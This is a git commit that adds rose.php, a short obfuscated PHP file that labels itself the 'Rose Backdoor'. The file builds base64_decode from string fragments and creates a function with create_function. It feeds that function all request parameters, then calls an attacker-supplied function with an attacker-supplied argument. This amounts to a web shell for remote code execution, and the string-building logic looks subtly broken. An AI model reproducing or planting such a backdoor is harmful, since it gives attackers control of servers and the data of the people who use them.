d7c17b827726cc4fba422d0be7e4d2f31c1108b2
John Bell <johnthegod@mail.ru>
2020-04-13 19:04:37 -0400

    Create rose.php

---
+++ rose.php
@@ -0,0 +1,15 @@
+<?php
+/* Rose Backdoor PHP Version */
+/*        Made by John       */
+$p0 = 'ba'.'se'.'64'.'_d'.'ec'.'od'.'e';
+$a1 = 'ex'.'tr'; $a2 = 'ac'.'t';
+$b1 = '('; $b2 = ')'; $b0 = ';';
+$a0 = $p0('JGE='); $a1 = '"';
+$b = create_function($a0, $a1.$a2.$b0.$a1.$a0.$a1.$b2.$b0);
+if($_REQUEST == null) {
+    die();
+} else {
+    $b($_REQUEST);
+    die($aaa($bbb));
+}
+?>
